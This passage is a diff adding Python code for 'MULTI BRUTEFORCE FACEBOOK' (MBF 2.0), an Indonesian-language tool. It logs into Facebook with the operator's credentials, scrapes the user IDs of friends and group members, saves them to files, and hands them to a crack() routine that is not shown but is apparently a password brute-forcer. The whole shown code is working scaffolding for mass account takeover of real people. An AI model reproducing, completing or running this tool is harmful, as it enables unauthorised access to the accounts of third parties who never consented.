+			cetak('!h[!] Berhasil meyimpan !cMBFgroup.txt')
+		except:
+			cetak('!m[!] Gagal meyimpan')
+	if len(id_bteman) != 0:
+		cetak('!h[*] Menyimpan hasil daftar Teman...')
+		try:
+			open(os.sys.path[0]+'/MBFteman.txt','w').write('\n'.join(id_bteman))
+			cetak('!h[!] Berhasil meyimpan !cMBFteman.txt')
+		except:
+			cetak('!m[!] Gagal meyimpan')
+def keluar():
+	simpan()
+	cetak('!m[!] Keluar')
+	sys.exit()
+def inputD(x,v=0):
+	while 1:
+		try:
+			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
+		except:
+			cetak('\n!m[!] Batal')
+			keluar()
+		if v:
+			if a.upper() in v:
+				break
+			else:
+				cetak('!m[!] Masukan Opsinya Bro...')
+				continue
+		else:
+			if len(a) == 0:
+				cetak('!m[!] Masukan dengan benar')
+				continue
+			else:
+				break
+	return a
+def inputM(x,d):
+	while 1:
+		try:
+			i = int(inputD(x))
+		except:
+			cetak('!m[!] Pilihan tidak ada')
+			continue
+		if i in d:
+			break
+		else:
+			cetak('!m[!] Pilihan tidak ada')
+	return i
+def lanjutG():
+	global fid_bgroup
+	if len(fid_bgroup) != 0:
+		i = inputD('[?] Riset Hasil Id Group/lanjutkan (r/l)',['R','L'])
+		if i.upper() == 'L':
+			return crack(fid_bgroup)
+		else:
+			os.remove(os.sys.path[0]+'/MBFgroup.txt')
+			fid_bgroup = []
+	return 0
+def lanjutT():
+	global fid_bteman
+	if len(fid_bteman) != 0:
+		i = inputD('[?] Riset Hasil Id Teman/lanjutkan (r/l)',['R','L'])
+		if i.upper() == 'L':
+			return crack(fid_bteman)
+		else:
+			os.remove(os.sys.path[0]+'/MBFteman.txt')
+			fid_bteman = []
+	return 0
+def buka(d):
+	try:
+		x = br.open(d)
+		br._factory.is_html = True
+		x = x.read()
+	except:
+		cetak('\r!m[!] Gagal membuka !p'+str(d))
+		keluar()
+	if '<link rel="redirect" href="' in x:
+		return buka(br.find_link().url)
+	else:
+		return x
+def login():
+	global log
+	us = inputD('[?] Email/HP')
+	pa = inputD('[?] Kata Sandi')
+	cetak('!h[*] Sedang Login....')
+	buka('https://m.facebook.com')
+	br.select_form(nr=0)
+	br.form['email']=us
+	br.form['pass']=pa
+	br.submit()
+	url = br.geturl()
+	if 'save-device' in url or 'm_sess' in url:
+		buka('https://mobile.facebook.com/home.php')
+		nama = br.find_link(url_regex='logout.php').text
+		nama = re.findall(r'\((.*a?)\)',nama)[0]
+		cetak('!h[*] Selamat datang !k%s'%nama)
+		cetak('!h[*] Semoga ini adalah hari keberuntungan mu...')
+		log = 1
+	elif 'checkpoint' in url:
+		cetak('!m[!] Akun kena checkpoint\n!k[!]Coba Login dengan opera mini')
+		keluar()
+	else:
+		cetak('!m[!] Login Gagal')
+def idgroup():
+	if log != 1:
+		cetak('!h[*] Login !bFB!h dulu bos...')
+		login()
+		if log == 0:
+			keluar()
+	next = saring_id_group0()
+	while 1:
+		saring_id_group1(buka(next))
+		try:
+			next = br.find_link(url_regex='/browse/group/members/').url
+		except:
+			cetak('!m[!] Hanya Bisa Mengambil !h %d id'%len(id_bgroup))
+			break
+	simpan()
+	i = inputD('[?] Langsung Crack (y/t)',['Y','T'])
+	if i.upper() == 'Y':
+		return crack(id_bgroup)
+	else:
+		return menu()
+def saring_id_teman(r):
+	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
+		id_bteman.append(i)
+def idteman():
+	if log != 1:
+		cetak('!h[*] Login !bFB !hdulu bos...')
+		login()
+		if log == 0:
+			keluar()
+	cetak('!h[*] Sedang mengumpulkan id teman...')
+	buka('https://m.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
+	jumlah = br.find_link(url_regex='/friends/center/friends/').text
+	jumlah = re.findall(r'\((.*a?)\)',jumlah)[0]
+	cetak('!h[*] Mengambil !p%s !hid teman'%jumlah) 
+	saring_id_teman(buka('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
+	try:
+		next = br.find_link(url_regex='friends_center_main').url
+	except:
+		if len(id_teman) != 0:
+			cetak('!m[!] Hanya dapat mengambil !p%d id'%len(id_bteman))
+		else:
+			cetak('!m[!] Batal')
+			keluar()
+	while 1:
+		saring_id_teman(buka(next))
+		cetak('\r!h[*] !p%s !hid terambil...'%len(id_bteman),1)
+		sys.stdout.flush()
+		try:
+			next = br.find_link(url_regex='friends_center_main').url
+		except:
+			cetak('\n!m[!] Hanya dapat mengambil !p%d id'%len(id_bteman))
+			break
+	simpan()
+	i = inputD('[?] Langsung Crack (y/t)',['Y','T'])
+	if i.upper() == 'Y':
+		return crack(id_bteman)
+	else:
+		return menu()
+def menu():
+	cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !c2.0!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cPIRMANSX\n !m* !phttps://github.com/pirmansx\n !m* !phttps://facebook.com/groups/164201767529837\n !m* !phttps://pirmansx.waper.com\n!k.======================.\n|!h  AMBIL !mID!h DARI.....  !k|\n'======================'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mKELUAR...")
+	i = inputM('[?] PILIH',[1,2,3])
+	if i == 2:
+		lanjutG()
+		idgroup()
+	elif i == 1:
+		lanjutT()
+		idteman()
+	elif i == 3:
+		keluar()
+bacaData()
+install_browser()
+menu()
+#
+#
+#
